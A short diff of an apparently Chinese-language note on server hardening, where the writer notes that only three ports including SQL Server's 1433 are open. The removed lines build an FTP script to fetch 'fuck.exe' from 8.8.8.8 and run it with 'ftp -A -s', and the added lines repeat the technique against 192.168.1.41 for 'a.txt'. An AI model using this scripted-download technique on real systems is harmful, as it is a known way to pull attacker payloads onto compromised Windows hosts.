@@ -16,5 +16,12 @@
 再加上SQL Server的1433，一台服务器总共才开了3个端口，这下应该比较安全了，装上防火墙。
 
 
-echo open 8.8.8.8  >a.txt & echo get fuck.exe>>a.txt &echo bye>>a.txt
-ftp -A -s:a.txt
+连接远程服务器，下载 a.txt
+
+```echo open 192.168.1.41 >ftp.txt & echo get a.txt>>ftp.txt &echo bye>>ftp.txt```
+
+[](1.jpg)
+
+```ftp -A -s:ftp.txt```
+
+[](2.jpg)
